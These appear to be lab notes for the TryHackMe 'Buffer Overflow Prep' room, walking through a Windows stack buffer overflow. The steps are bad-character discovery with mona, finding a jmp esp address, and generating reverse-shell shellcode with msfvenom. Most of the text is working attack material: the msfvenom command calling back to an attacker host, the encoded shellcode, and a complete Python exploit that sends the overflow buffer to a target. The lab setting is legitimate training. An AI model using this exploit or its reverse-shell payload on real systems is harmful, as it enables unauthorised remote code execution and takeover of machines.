
https://tryhackme.com/r/room/bufferoverflowprep

```
!mona bytearray -b "\x00"
```

update exploit.py to include the payload `\x01`-`\xff` and run it

in immunity debugger, run:
```
!mona compare -f bytearray.bin -a 0188FA30
```

Bad chars: 00 07 08 2e 2f a0 a1

![[Images/Pasted image 20241011154211.png]]
![[Images/Pasted image 20241011154427.png]]

Now double check by removing the badchars from the payload and rerun.

```
!mona bytearray2 -b "\x00\x07\x08\x2e\x2f\xa0\xa1"
```

in immunity debugger, run:
```
!mona compare -f bytearray.bin -a 0188FA30
```

```
!mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"
```
finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified.
![[Images/Pasted image 20241011161446.png]]

Setting `retn` in the python script to use address `0x625011af`.

Create a payload without badchars
```sh
msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=443 -f 'python' -b '\x00\x07\x08\x2e\x2f\xa0\xa1'
```

```sh
┌──(kali㉿kali)-[~/thm/bufferoverflowprep]
└─$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=443 -f 'python' -b '\x00\x07\x08\x2e\x2f\xa0\xa1'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1745 bytes
buf =  b""
buf += b"\xd9\xe5\xd9\x74\x24\xf4\xbd\x4e\x7b\x4d\x3c\x58"
buf += b"\x29\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13\x03\x26"
buf += b"\x68\xaf\xc9\x4a\x66\xad\x32\xb2\x77\xd2\xbb\x57"
buf += b"\x46\xd2\xd8\x1c\xf9\xe2\xab\x70\xf6\x89\xfe\x60"
buf += b"\x8d\xfc\xd6\x87\x26\x4a\x01\xa6\xb7\xe7\x71\xa9"
buf += b"\x3b\xfa\xa5\x09\x05\x35\xb8\x48\x42\x28\x31\x18"
buf += b"\x1b\x26\xe4\x8c\x28\x72\x35\x27\x62\x92\x3d\xd4"
buf += b"\x33\x95\x6c\x4b\x4f\xcc\xae\x6a\x9c\x64\xe7\x74"
buf += b"\xc1\x41\xb1\x0f\x31\x3d\x40\xd9\x0b\xbe\xef\x24"
buf += b"\xa4\x4d\xf1\x61\x03\xae\x84\x9b\x77\x53\x9f\x58"
buf += b"\x05\x8f\x2a\x7a\xad\x44\x8c\xa6\x4f\x88\x4b\x2d"
buf += b"\x43\x65\x1f\x69\x40\x78\xcc\x02\x7c\xf1\xf3\xc4"
buf += b"\xf4\x41\xd0\xc0\x5d\x11\x79\x51\x38\xf4\x86\x81"
buf += b"\xe3\xa9\x22\xca\x0e\xbd\x5e\x91\x46\x72\x53\x29"
buf += b"\x97\x1c\xe4\x5a\xa5\x83\x5e\xf4\x85\x4c\x79\x03"
buf += b"\xe9\x66\x3d\x9b\x14\x89\x3e\xb2\xd2\xdd\x6e\xac"
buf += b"\xf3\x5d\xe5\x2c\xfb\x8b\xaa\x7c\x53\x64\x0b\x2c"
buf += b"\x13\xd4\xe3\x26\x9c\x0b\x13\x49\x76\x24\xbe\xb0"
buf += b"\x11\x41\x2a\xa5\x8e\x3d\x56\xd9\x51\x05\xdf\x3f"
buf += b"\x3b\x69\xb6\xe8\xd4\x10\x93\x62\x44\xdc\x09\x0f"
buf += b"\x46\x56\xbe\xf0\x09\x9f\xcb\xe2\xfe\x6f\x86\x58"
buf += b"\xa8\x70\x3c\xf4\x36\xe2\xdb\x04\x30\x1f\x74\x53"
buf += b"\x15\xd1\x8d\x31\x8b\x48\x24\x27\x56\x0c\x0f\xe3"
buf += b"\x8d\xed\x8e\xea\x40\x49\xb5\xfc\x9c\x52\xf1\xa8"
buf += b"\x70\x05\xaf\x06\x37\xff\x01\xf0\xe1\xac\xcb\x94"
buf += b"\x74\x9f\xcb\xe2\x78\xca\xbd\x0a\xc8\xa3\xfb\x35"
buf += b"\xe5\x23\x0c\x4e\x1b\xd4\xf3\x85\x9f\xe4\xb9\x87"
buf += b"\xb6\x6c\x64\x52\x8b\xf0\x97\x89\xc8\x0c\x14\x3b"
buf += b"\xb1\xea\x04\x4e\xb4\xb7\x82\xa3\xc4\xa8\x66\xc3"
buf += b"\x7b\xc8\xa2"
```

Add 16 or more nops - When the payload in decoded/unpacked it will take more space.

Finished exploit.py:
```python
import socket

ip = "10.10.22.167"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" #0x625011af
padding = "\x90" * 16  #space to expand in

# msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=443 -f 'python' -b '\x00\x07\x08\x2e\x2f\xa0\xa1'
buf =  ""
buf += "\xd9\xe5\xd9\x74\x24\xf4\xbd\x4e\x7b\x4d\x3c\x58"
buf += "\x29\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13\x03\x26"
buf += "\x68\xaf\xc9\x4a\x66\xad\x32\xb2\x77\xd2\xbb\x57"
buf += "\x46\xd2\xd8\x1c\xf9\xe2\xab\x70\xf6\x89\xfe\x60"
buf += "\x8d\xfc\xd6\x87\x26\x4a\x01\xa6\xb7\xe7\x71\xa9"
buf += "\x3b\xfa\xa5\x09\x05\x35\xb8\x48\x42\x28\x31\x18"
buf += "\x1b\x26\xe4\x8c\x28\x72\x35\x27\x62\x92\x3d\xd4"
buf += "\x33\x95\x6c\x4b\x4f\xcc\xae\x6a\x9c\x64\xe7\x74"
buf += "\xc1\x41\xb1\x0f\x31\x3d\x40\xd9\x0b\xbe\xef\x24"
buf += "\xa4\x4d\xf1\x61\x03\xae\x84\x9b\x77\x53\x9f\x58"
buf += "\x05\x8f\x2a\x7a\xad\x44\x8c\xa6\x4f\x88\x4b\x2d"
buf += "\x43\x65\x1f\x69\x40\x78\xcc\x02\x7c\xf1\xf3\xc4"
buf += "\xf4\x41\xd0\xc0\x5d\x11\x79\x51\x38\xf4\x86\x81"
buf += "\xe3\xa9\x22\xca\x0e\xbd\x5e\x91\x46\x72\x53\x29"
buf += "\x97\x1c\xe4\x5a\xa5\x83\x5e\xf4\x85\x4c\x79\x03"
buf += "\xe9\x66\x3d\x9b\x14\x89\x3e\xb2\xd2\xdd\x6e\xac"
buf += "\xf3\x5d\xe5\x2c\xfb\x8b\xaa\x7c\x53\x64\x0b\x2c"
buf += "\x13\xd4\xe3\x26\x9c\x0b\x13\x49\x76\x24\xbe\xb0"
buf += "\x11\x41\x2a\xa5\x8e\x3d\x56\xd9\x51\x05\xdf\x3f"
buf += "\x3b\x69\xb6\xe8\xd4\x10\x93\x62\x44\xdc\x09\x0f"
buf += "\x46\x56\xbe\xf0\x09\x9f\xcb\xe2\xfe\x6f\x86\x58"
buf += "\xa8\x70\x3c\xf4\x36\xe2\xdb\x04\x30\x1f\x74\x53"
buf += "\x15\xd1\x8d\x31\x8b\x48\x24\x27\x56\x0c\x0f\xe3"
buf += "\x8d\xed\x8e\xea\x40\x49\xb5\xfc\x9c\x52\xf1\xa8"
buf += "\x70\x05\xaf\x06\x37\xff\x01\xf0\xe1\xac\xcb\x94"
buf += "\x74\x9f\xcb\xe2\x78\xca\xbd\x0a\xc8\xa3\xfb\x35"
buf += "\xe5\x23\x0c\x4e\x1b\xd4\xf3\x85\x9f\xe4\xb9\x87"
buf += "\xb6\x6c\x64\x52\x8b\xf0\x97\x89\xc8\x0c\x14\x3b"
buf += "\xb1\xea\x04\x4e\xb4\xb7\x82\xa3\xc4\xa8\x66\xc3"
buf += "\x7b\xc8\xa2"
payload = buf

#badchars 00 07 08 2e 2f a0 a1
#payload = "\x01\x02\x03\x04\x05\x06\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

```